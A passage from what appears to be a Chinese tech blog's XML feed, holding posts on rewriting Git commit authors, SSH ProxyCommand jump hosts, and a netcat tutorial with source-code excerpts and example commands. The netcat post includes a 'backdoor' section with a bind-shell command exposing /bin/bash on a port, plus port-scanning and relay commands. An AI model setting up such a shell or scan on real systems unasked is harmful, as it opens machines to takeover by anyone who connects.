        <tags>
            
            <tag> Linux </tag>
            
            <tag> Docker </tag>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git使用技巧</title>
      <link href="/2019/10/10/git-skill/"/>
      <url>/2019/10/10/git-skill/</url>
      
        <content type="html"><![CDATA[<h2 id="一、分支管理"><a href="#一、分支管理" class="headerlink" title="一、分支管理"></a>一、分支管理</h2><h2 id="二、提交日志管理"><a href="#二、提交日志管理" class="headerlink" title="二、提交日志管理"></a>二、提交日志管理</h2><ul><li>批量替换历史提交日志的用户名和邮箱信息</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git filter-branch -f --env-filter <span class="string">&#x27;</span></span><br><span class="line"><span class="string">OLD_NAME=&quot;old_name&quot;</span></span><br><span class="line"><span class="string">OLD_EMAIL=&quot;old@mail.com&quot;</span></span><br><span class="line"><span class="string">CORRECT_NAME=&quot;new_name&quot;</span></span><br><span class="line"><span class="string">CORRECT_EMAIL=&quot;new@mail.com&quot;</span></span><br><span class="line"><span class="string">if [ &quot;$GIT_COMMITTER_EMAIL&quot; = &quot;$OLD_EMAIL&quot; ]</span></span><br><span class="line"><span class="string">then</span></span><br><span class="line"><span class="string">    export GIT_COMMITTER_NAME=&quot;$CORRECT_NAME&quot;</span></span><br><span class="line"><span class="string">    export GIT_COMMITTER_EMAIL=&quot;$CORRECT_EMAIL&quot;</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string">if [ &quot;$GIT_AUTHOR_EMAIL&quot; = &quot;$OLD_EMAIL&quot; ]</span></span><br><span class="line"><span class="string">then</span></span><br><span class="line"><span class="string">    export GIT_AUTHOR_NAME=&quot;$CORRECT_NAME&quot;</span></span><br><span class="line"><span class="string">    export GIT_AUTHOR_EMAIL=&quot;$CORRECT_EMAIL&quot;</span></span><br><span class="line"><span class="string">fi</span></span><br><span class="line"><span class="string">&#x27;</span> --tag-name-filter <span class="built_in">cat</span> -- --branches --tags</span><br></pre></td></tr></table></figure><h2 id="三、用户管理"><a href="#三、用户管理" class="headerlink" title="三、用户管理"></a>三、用户管理</h2>]]></content>
      
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh的高级用法 - ProxyCommand</title>
      <link href="/2019/10/09/ssh-proxycommand/"/>
      <url>/2019/10/09/ssh-proxycommand/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>OpenSSH</code>的客户端有一个 <code>ProxyCommand</code> 的选项，用于 <code>SSH 客户端</code>与<code>服务器</code>之间的<code>隧道通信(tunneling)</code>。所谓的隧道技术，也称代理技术，是网络通信技术的一个普遍概念，就是把一条信道建立于另外一条信道之上。</p><p><code>SSH</code> 会话基于一个 <code>TCP</code> 连接，如果我们把连接的两个端口各自的出口（也即入口）进行截获，就可以用其它的信道来传输。而且 <code>SSH</code> 仍然认为它用的是和另一端连接一条<code> TCP</code> 连接。</p><p><code>ProxyCommand</code> 指定一个命令（称为<code> Proxy</code>），<code>SSH</code> 客户端将通过标准输入输出和这个命令启动后的进程进行正常的 <code>SSH</code> 通信，而 <code>Proxy</code> 连接着<code> SSH</code> 服务器（一般是一个 <code>Server Proxy</code>，再由该 <code>Server Proxy</code> 连接服务器）。<code>Proxy</code> 和 <code>Server Proxy</code> 之间组成了一条隧道，如果两者之间用 <code>HTTP</code> 协议进行通信，则整个系统便称为<code>tunneling SSH over HTTP</code>，当然也可以使用 <code>UDP</code>、<code>TCP</code>、<code>IP</code> 以及其它任意的可行的协议。</p><p><code>SSH ProxyCommand</code> 相对于 <code>SOCKS</code>、<code>HTTP</code> 或者其它的<code>Proxy</code>技术来说更简单。因为它工作在进程间的<code>文件 IO </code>通信，用任何支持 <code>socket</code> 的编程语言，都能轻易地编写出一个可用的 Proxy，复杂度只落在隧道本身。想一想，如果没有 <code>ProxyCommand</code>，你需要改变或侵入操作系统的 <code>TCP 子系统</code>才能实现 <code>SSH 隧道</code>。<code>ProxyCommand</code> 提供了方便应用隧道的接口，网络程序都应该提供这样的接口，而不是完全依赖于 socket。</p><p>因为一个会话就会启动一个 ProxyCommand 进程，所以只有在会话依赖于连接的协议上才能使用这种技术。</p><h2 id="二、实践"><a href="#二、实践" class="headerlink" title="二、实践"></a>二、实践</h2><p>环境说明</p><ul><li>远程服务器的IP地址为<code>180.0.0.1</code>，代号为<code>X</code>；</li><li>另一个远程服务器的IP为<code>180.0.0.2</code>，代号为<code>Y</code>；</li><li>目前本机的IP地址为<code>10.0.0.1</code>，代号为<code>A</code>，本地可以利用SSH客户端通过密钥或密码连接<code>X</code>和<code>Y</code>；</li></ul><p>这里实际使用的为全部使用密钥的方式进行访问，暂时<code>X</code>与<code>Y</code>之间无法通过密钥进行访问。</p><h3 id="2-1、通过ssh原生支持的指令实现"><a href="#2-1、通过ssh原生支持的指令实现" class="headerlink" title="2.1、通过ssh原生支持的指令实现"></a>2.1、通过ssh原生支持的指令实现</h3><p><code>A</code>本地的<code>～/.ssh/config</code>的配置文件信息如下，通过X连接到Y；</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Host X</span><br><span class="line">        HostName 180.0.0.1</span><br><span class="line">        User bugwz</span><br><span class="line">        Port 18001</span><br><span class="line">        PreferredAuthentications publickey</span><br><span class="line">        IdentityFile ~/.ssh/bugwz_181</span><br><span class="line">Host Y</span><br><span class="line">        HostName 180.0.0.2</span><br><span class="line">        User bugwz</span><br><span class="line">        Port 18002</span><br><span class="line">        PreferredAuthentications publickey</span><br><span class="line">        IdentityFile ~/.ssh/bugwz_182</span><br><span class="line">Host <span class="built_in">test</span></span><br><span class="line">    HostName 180.0.0.2</span><br><span class="line">    User bugwz</span><br><span class="line">    Port 18002</span><br><span class="line">    IdentityFile ~/.ssh/bugwz_182</span><br><span class="line">    ProxyCommand ssh X -W %h:%p</span><br></pre></td></tr></table></figure><p><strong>原理分析：</strong></p><ul><li>本地<code>A</code>机器通过<code>ProxyCommand</code>先与<code>X</code>建立一个<code>SSH</code>连接，并把这个连接当作一个代理使用；</li><li><code>X</code>在与<code>Y</code>建立<code>SSH</code>连接，使用的认证方式为<code>A</code>的认证密钥，因此不需要将认证密钥存放在<code>X</code>端；</li><li><code>A</code>与<code>Y</code>就建立了一个间接的<code>SSH</code>连接；</li></ul><p><strong>困惑：</strong></p><p>目前遇到一个现象，当我们通过<code>X</code>连接到<code>Y</code>之后，在将<code>X</code>上的<code>sshd</code>杀掉之后，发现在<code>A</code>上与<code>Y</code>建立的连接依旧保持通畅，但是再次新建通过<code>X</code>访问<code>Y</code>的链接无法成功建立，怀疑这与sshd的机制有关系，是否会保持已有的会话连接？后续继续分析一下，此处保留困惑。</p><h3 id="2-2、借助nc来实现"><a href="#2-2、借助nc来实现" class="headerlink" title="2.2、借助nc来实现"></a>2.2、借助nc来实现</h3><p>一些说明：</p><ul><li><code>-W</code>：该参数在<code>OpenSSH 5.4</code>及之后的版本才支持，参考<a href="http://www.openssh.com/txt/release-5.4">官方的Release信息</a>；</li></ul><p>在使用<code>-W</code>之前，通常都是使用<code>nc</code>选项，<code>nc</code>允许你转发<code>TCP/UDP</code>数据包到指定（备用）位置并且基本上与<code>ssh -W</code>相同；</p><p>待补充！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nc指令的使用与源码解析 - 每周指令</title>
      <link href="/2019/09/28/command-nc/"/>
      <url>/2019/09/28/command-nc/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>nc</code>的全称为<a href="http://netcat.sourceforge.net/">Netcat</a>，是一款拥有多种功能的 CLI 工具，可以在网络上进行读&#x2F;写以及重定向数据等操作，被誉为是网络界的瑞士军刀。它被设计成可以被脚本或其他程序调用的可靠的后端工具。同时由于它能创建任意所需的连接，因此它是一个非常好用的网络工具，它的主要用途为：</p><ul><li><code>文件传输</code>：由于是直接建立TCP连接发送数据流，因此使用nc传输文件是不安全的，但是速度很快；</li><li><code>端口扫描</code>：可用于批量扫描指定IP的端口是否可用；</li><li><code>代理服务器</code>：简单的代理服务器；</li><li>等等；</li></ul><h2 id="二、源码解析"><a href="#二、源码解析" class="headerlink" title="二、源码解析"></a>二、源码解析</h2><ul><li><p>官方nc（Netcat）的代码的下载地址为：<a href="http://netcat.sourceforge.net/download.php%EF%BC%9B">http://netcat.sourceforge.net/download.php；</a></p></li><li><p>nc（Netcat）各版本的代码已经存储到 <a href="https://github.com/bugwz/netcat">bugwz&#x2F;netcat</a>；</p></li></ul><h3 id="2-1、工作模式"><a href="#2-1、工作模式" class="headerlink" title="2.1、工作模式"></a>2.1、工作模式</h3><p>nc共有四种连接模式，一下列出的连接模式按照索引等级由低到高，具体模式的含义解释以及相关的结构体代码如下所示：</p><ul><li><p><code>未制定模式</code>：默认的模式；</p></li><li><p><code>连接模式</code>：未使用<code>-l</code>和<code>-L</code>参数，通常为客户端连接其他IP的对应端口时启用该模式；</p></li><li><p><code>监听模式</code>：使用<code>-l</code>参数进入该模式；</p></li><li><p><code>隧道模式</code>：使用<code>-L</code>参数进入该模式；</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">  NETCAT_UNSPEC,</span><br><span class="line">  NETCAT_CONNECT,</span><br><span class="line">  NETCAT_LISTEN,</span><br><span class="line">  NETCAT_TUNNEL</span><br><span class="line">&#125; <span class="type">nc_mode_t</span>;</span><br></pre></td></tr></table></figure><h3 id="2-2、支持协议"><a href="#2-2、支持协议" class="headerlink" title="2.2、支持协议"></a>2.2、支持协议</h3><p>nc支持TCP和UDP协议，默认支持的协议为TCP协议；</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">  NETCAT_PROTO_UNSPEC,</span><br><span class="line">  NETCAT_PROTO_TCP,</span><br><span class="line">  NETCAT_PROTO_UDP</span><br><span class="line">&#125; <span class="type">nc_proto_t</span>;</span><br></pre></td></tr></table></figure><h3 id="2-3、主机以及端口存储结构"><a href="#2-3、主机以及端口存储结构" class="headerlink" title="2.3、主机以及端口存储结构"></a>2.3、主机以及端口存储结构</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 这是标准的netcat主机记录。 它包含一个&#x27;权威&#x27;名称字段，该字段可以为空，</span></span><br><span class="line"><span class="comment"> * 以及网络符号和点分字符串符号中的IP地址列表。*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> name[MAXHOSTNAMELEN];<span class="comment">/* DNS名称 */</span></span><br><span class="line">  <span class="type">char</span> addrs[MAXINETADDRS][NETCAT_ADDRSTRLEN];<span class="comment">/* ascii格式的IP地址 */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">iaddrs</span>[<span class="title">MAXINETADDRS</span>];</span><span class="comment">/* 真实地址 */</span></span><br><span class="line">&#125; <span class="type">nc_host_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 标准netcat端口记录。 它包含端口名称（可以为空）以及端口号（以数字和字符串形式） */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> name[NETCAT_MAXPORTNAMELEN];<span class="comment">/* 规范端口名称 */</span></span><br><span class="line">  <span class="type">char</span> ascnum[<span class="number">8</span>];<span class="comment">/* ascii端口号 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> num;<span class="comment">/* 端口号 */</span></span><br><span class="line">  <span class="comment">/* FIXME：这只是一个测试! */</span></span><br><span class="line">  <span class="type">in_port_t</span> netnum;<span class="comment">/* 网络字节顺序的端口号 */</span></span><br><span class="line">&#125; <span class="type">nc_port_t</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-4、网络连接Socker存储结构"><a href="#2-4、网络连接Socker存储结构" class="headerlink" title="2.4、网络连接Socker存储结构"></a>2.4、网络连接Socker存储结构</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> fd, domain, timeout;</span><br><span class="line">  <span class="type">nc_proto_t</span> proto;</span><br><span class="line">  <span class="type">nc_host_t</span> local_host, host;</span><br><span class="line">  <span class="type">nc_port_t</span> local_port, port;</span><br><span class="line">  <span class="type">nc_buffer_t</span> sendq, recvq;</span><br><span class="line">&#125; <span class="type">nc_sock_t</span>;</span><br></pre></td></tr></table></figure><h3 id="2-5、数据缓存与IO读写"><a href="#2-5、数据缓存与IO读写" class="headerlink" title="2.5、数据缓存与IO读写"></a>2.5、数据缓存与IO读写</h3><p>数据缓存的结构体如下所示：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 用于队列缓冲和数据跟踪。 &#x27;head&#x27;字段是指向缓冲区段开始的指针，而&#x27;pos&#x27;表示数据流的实际位置。 </span></span><br><span class="line"><span class="comment"> * 如果&#x27;head&#x27;为NULL，则意味着该缓冲区中没有动态分配的数据，但是它可能仍包含一些本地数据段</span></span><br><span class="line"><span class="comment"> * （例如，在堆栈内部分配）。 &#x27;len&#x27;表示从&#x27;pos&#x27;开始的缓冲区的长度。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *head;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *pos;</span><br><span class="line">  <span class="type">int</span> len;</span><br><span class="line">&#125; <span class="type">nc_buffer_t</span>;</span><br></pre></td></tr></table></figure><p>网络IO的主要的处理函数为<code>int core_readwrite(nc_sock_t *nc_main, nc_sock_t *nc_slave)</code>，该函数循环操作网络IO，相关部分代码如下所示：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 处理标准输入/标准输出/网络IO. */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">core_readwrite</span><span class="params">(<span class="type">nc_sock_t</span> *nc_main, <span class="type">nc_sock_t</span> *nc_slave)</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd_stdin, fd_stdout, fd_sock, fd_max;</span><br><span class="line">    <span class="type">int</span> read_ret, write_ret;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="type">bool</span> inloop = TRUE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* IO类型判断等代码省略... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (inloop) &#123;</span><br><span class="line">        <span class="type">bool</span> call_select = TRUE;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">recv_addr</span>;</span> <span class="comment">/* 仅由UDP协议使用 */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> recv_len = <span class="keyword">sizeof</span>(recv_addr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 终端信号处理及io队列判断等代码省略... */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 出于优化原因，我们为两个接收队列都有一个公共缓冲区，</span></span><br><span class="line"><span class="comment">         * 因此，现在可以处理数据，因此该缓冲区可用于其他套接字事件. */</span></span><br><span class="line">        <span class="keyword">if</span> (nc_slave-&gt;recvq.len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* 省略部分代码... */</span></span><br><span class="line">            <span class="comment">/* 如果远程发送队列为空，则将整个数据块移至此处 */</span></span><br><span class="line">            <span class="keyword">if</span> (rem_sendq-&gt;len == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">/* 省略部分代码... */</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!my_recvq-&gt;head) &#123;</span><br><span class="line">                <span class="comment">/* 将数据块移动到专用的分配空间中 */</span></span><br><span class="line">                debug_v((<span class="string">&quot;  reallocating %d data bytes in slave-&gt;recvq&quot;</span>,</span><br><span class="line">                         my_recvq-&gt;len));</span><br><span class="line">                my_recvq-&gt;head = <span class="built_in">malloc</span>(my_recvq-&gt;len);</span><br><span class="line">                <span class="built_in">memcpy</span>(my_recvq-&gt;head, my_recvq-&gt;pos, my_recvq-&gt;len);</span><br><span class="line">                my_recvq-&gt;pos = my_recvq-&gt;head;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 从标准输入读取，现在由于与上述相同的原因而处理nc_slave sendq。 </span></span><br><span class="line"><span class="comment">         * 可能会有一个公共缓冲区在队列中移动，因此，如果是这种情况，请对其</span></span><br><span class="line"><span class="comment">         * 进行处理，以便可以重复使用。如果必须延迟更多时间，请将其复制到</span></span><br><span class="line"><span class="comment">         * 动态分配的空间中. */</span></span><br><span class="line">        <span class="keyword">if</span> (nc_main-&gt;sendq.len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* 省略部分代码... */</span></span><br><span class="line">            write_ret = write(fd_sock, data, data_len);</span><br><span class="line">            <span class="keyword">if</span> (write_ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (errno == EAGAIN)</span><br><span class="line">                    write_ret = <span class="number">0</span>; <span class="comment">/* 写会阻塞，将其附加以选择 */</span></span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    perror(<span class="string">&quot;write(net)&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 从套接字（网络）读取 */</span></span><br><span class="line">        <span class="keyword">if</span> (call_select &amp;&amp; FD_ISSET(fd_sock, &amp;ins)) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((nc_main-&gt;proto == NETCAT_PROTO_UDP) &amp;&amp; opt_zero) &#123;</span><br><span class="line">                <span class="built_in">memset</span>(&amp;recv_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(recv_addr));</span><br><span class="line">                <span class="comment">/* 这使我们能够从不同的地址获取数据包 */</span></span><br><span class="line">                read_ret = recvfrom(fd_sock, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>,</span><br><span class="line">                                    (<span class="keyword">struct</span> sockaddr *)&amp;recv_addr, &amp;recv_len);</span><br><span class="line">                <span class="comment">/* 当recvfrom（）调用失败时，recv_addr保持不变 */</span></span><br><span class="line">                debug_dv((<span class="string">&quot;recvfrom(net) = %d (address=%s:%d)&quot;</span>, read_ret,</span><br><span class="line">                          netcat_inet_ntop(&amp;recv_addr.sin_addr),</span><br><span class="line">                          ntohs(recv_addr.sin_port)));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* 通用文件读取回退 */</span></span><br><span class="line">                read_ret = read(fd_sock, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">                debug_dv((<span class="string">&quot;read(net) = %d&quot;</span>, read_ret));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 省略部分代码... */</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 处理网络接收队列 */</span></span><br><span class="line">        <span class="keyword">if</span> (nc_main-&gt;recvq.len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">nc_buffer_t</span> *my_recvq = &amp;nc_main-&gt;recvq;</span><br><span class="line">            <span class="type">nc_buffer_t</span> *rem_sendq = &amp;nc_slave-&gt;sendq;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 检查telnet代码（如果启用）。</span></span><br><span class="line"><span class="comment">             * 请注意，缓冲的输出间隔不适用于telnet代码答案 */</span></span><br><span class="line">            <span class="keyword">if</span> (opt_telnet) netcat_telnet_parse(nc_main);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* telnet解析可能返回0个字符! */</span></span><br><span class="line">            <span class="keyword">if</span> (my_recvq-&gt;len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">/* 如果远程发送队列为空，则将整个数据块移至此处 */</span></span><br><span class="line">                <span class="keyword">if</span> (rem_sendq-&gt;len == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="built_in">memcpy</span>(rem_sendq, my_recvq, <span class="keyword">sizeof</span>(*rem_sendq));</span><br><span class="line">                    <span class="built_in">memset</span>(my_recvq, <span class="number">0</span>, <span class="keyword">sizeof</span>(*my_recvq));</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!my_recvq-&gt;head) &#123;</span><br><span class="line">                    <span class="comment">/* 将数据块移动到专用的分配空间中 */</span></span><br><span class="line">                    my_recvq-&gt;head = <span class="built_in">malloc</span>(my_recvq-&gt;len);</span><br><span class="line">                    <span class="built_in">memcpy</span>(my_recvq-&gt;head, my_recvq-&gt;pos, my_recvq-&gt;len);</span><br><span class="line">                    my_recvq-&gt;pos = my_recvq-&gt;head;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* 省略部分代码... */</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 我们从网上得到了EOF，请关闭 */</span></span><br><span class="line">    shutdown(fd_sock, SHUT_RDWR);</span><br><span class="line">    close(fd_sock);</span><br><span class="line">    nc_main-&gt;fd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 仅在不是模拟时才关闭从属套接字 */</span></span><br><span class="line">    <span class="keyword">if</span> (nc_slave-&gt;domain != PF_UNSPEC) &#123;</span><br><span class="line">        shutdown(fd_stdin, SHUT_RDWR);</span><br><span class="line">        close(fd_stdin);</span><br><span class="line">        nc_slave-&gt;fd = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 恢复外部信号处理程序 */</span></span><br><span class="line">    signal_handler = TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="comment">/* core_readwrite（）的结尾 */</span></span><br></pre></td></tr></table></figure><h2 id="三、参数解析"><a href="#三、参数解析" class="headerlink" title="三、参数解析"></a>三、参数解析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usage: nc [-46AacCDdEFhklMnOortUuvz] [-K tc] [-b boundif] [-i interval] [-p source_port] [--apple-delegate-pid pid] [--apple-delegate-uuid uuid]</span><br><span class="line">  [-s source_ip_address] [-w timeout] [-X proxy_version]</span><br><span class="line">  [-x proxy_address[:port]] [hostname] [port[s]]</span><br></pre></td></tr></table></figure><ul><li><code>-4</code>：使用IPv4；</li><li><code>-6</code>：使用IPv6；</li><li><code>-A</code>：在套接字上设置SO_RECV_ANYIF；</li><li><code>-a</code>：在套接字上设置SO_AWDL_UNRESTRICTED；</li><li><code>-b</code>：将套接字绑定到指定的接口，需要附带参数；</li><li><code>-c</code>：发送CRLF作为行尾；</li><li><code>-C</code>：不要使用蜂窝数据连接？？？</li><li><code>-D</code>：启用调试套接字选项；</li><li><code>-d</code>：后台运行；</li><li><code>-E</code>：Don’t use expensive interfaces；</li><li><code>-F</code>：Do not use flow advisory (flow adv enabled by default)；</li><li><code>-G</code>：连接超时时间（秒）</li><li><code>-h</code>：显示帮助</li><li><code>-H</code>：初始化空闲超时时间（秒），需要附带参数；</li><li><code>-I</code>：重复空闲超时的间隔（秒），需要附带参数；</li><li><code>-i</code>：发送线路、扫描端口的延迟间隔，需要附带参数；</li><li><code>-J</code>：重复空闲超时的次数，需要附带参数；</li><li><code>-k</code>：为多个连接保持入站套接字打开；</li><li><code>-K</code>：指定流量类别，需要附带参数；</li><li><code>-l</code>：侦听模式，用于入站连接；</li><li><code>-L</code>：生成读取超时事件之前要发送的探测数，需要附带参数；</li><li><code>-m</code>：在套接字上设置SO_INTCOPROC_ALLOW；</li><li><code>-n</code>：禁止名称&#x2F;端口解析；</li><li><code>-M</code>：使用MULTIPATH域套接字；</li><li><code>-N</code>：生成写超时事件之前要发送的探测数，需要附带参数；</li><li><code>-O</code>：使用老式的connect代替connectx；</li><li><code>-p</code>：指定用于远程连接的本地端口（不能与-l一起使用），需要指定参数；</li><li><code>-r</code>：随机化远程端口；</li><li><code>-s</code>：本地源地址，需要附带参数；</li><li><code>-t</code>：回复Telnet请求；</li><li><code>-U</code>：使用Unix域套接字</li><li><code>-u</code>：UDP模式；</li><li><code>-v</code>：详细信息模式；</li><li><code>-w</code>：连接和最终网络读取超时，需要附带参数；</li><li><code>-X</code>：代理协议，可选参数为socks4、socks5或connect；</li><li><code>-x</code>：指定代理地址和端口；</li><li><code>-z</code>：零I&#x2F;O模式[用于扫描]；</li><li><code>-o</code>：连接&#x2F;绑定后发出套接字选项；</li><li><code>--apple-delegate-pid</code>：使用pid将socket设置为委托；</li></ul><h2 id="四、常用指令"><a href="#四、常用指令" class="headerlink" title="四、常用指令"></a>四、常用指令</h2><h3 id="4-1、文件传输"><a href="#4-1、文件传输" class="headerlink" title="4.1、文件传输"></a>4.1、文件传输</h3><p>接收数据的机器：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -4l 54321 &gt; recv.file</span><br></pre></td></tr></table></figure><p>发送数据的机器：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 192.168.1.100 54321 &lt; send.file</span><br></pre></td></tr></table></figure><h3 id="4-2、端口连通性检测"><a href="#4-2、端口连通性检测" class="headerlink" title="4.2、端口连通性检测"></a>4.2、端口连通性检测</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可使用 -u 检测UDP端口</span></span><br><span class="line">nc -v 192.168.1.100 54321</span><br></pre></td></tr></table></figure><h3 id="4-3、连接端口"><a href="#4-3、连接端口" class="headerlink" title="4.3、连接端口"></a>4.3、连接端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可使用 -u 连接UDP端口</span></span><br><span class="line">nc -4l 192.168.1.100 54321</span><br></pre></td></tr></table></figure><h3 id="4-4、聊天室"><a href="#4-4、聊天室" class="headerlink" title="4.4、聊天室"></a>4.4、聊天室</h3><p>服务器端：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -4l 54321</span><br></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 192.168.1.100 54321</span><br></pre></td></tr></table></figure><h3 id="4-5、代理服务器"><a href="#4-5、代理服务器" class="headerlink" title="4.5、代理服务器"></a>4.5、代理服务器</h3><p>目前有三台机器A（<code>192.168.1.100</code>）、B（<code>192.168.1.101</code>）、C（<code>192.168.1.102</code>），现在需要把<code>B</code>当作代理服务器，把发送到<code>B</code>的<code>80</code>端口的流量全部转发到<code>C</code>的<code>8080</code>端口，确保<code>C</code>的<code>8080</code>端口处于监听状态，执行步骤如下：</p><h4 id="4-5-1、单向管道"><a href="#4-5-1、单向管道" class="headerlink" title="4.5.1、单向管道"></a>4.5.1、单向管道</h4><ul><li><p>在B上执行如下指令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -l 80 | nc 192.168.1.102 8080</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-5-2、双向管道"><a href="#4-5-2、双向管道" class="headerlink" title="4.5.2、双向管道"></a>4.5.2、双向管道</h4><ul><li><p>在B上执行如下指令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkfifo</span> 2way</span><br><span class="line">nc -4l 80 0&lt;2way | nc 192.168.1.100 8080 1&gt;2way</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h3 id="4-6、nc后门-反弹Shell"><a href="#4-6、nc后门-反弹Shell" class="headerlink" title="4.6、nc后门(反弹Shell)"></a>4.6、nc后门(反弹Shell)</h3><p>服务器端创建后门的命令：-e&#96; 标志将一个 bash 与端口 10000 相连。现在客户端只要连接到服务器上的 10000 端口就能通过 bash 获取我们系统的完整访问权限：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -4l 54321 -e /bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端连接后即可执行正常的Shell指令，连接指令如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 192.168.1.100 54321</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-7、扫描端口"><a href="#4-7、扫描端口" class="headerlink" title="4.7、扫描端口"></a>4.7、扫描端口</h3><p>扫描目标IP的制定的端口范围；</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -v -z -n -w 1 192.168.1.100 1-1023</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> nc </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typora与PicGo的使用笔记</title>
      <link href="/2019/09/22/typora-picgo/"/>
      <url>/2019/09/22/typora-picgo/</url>
      
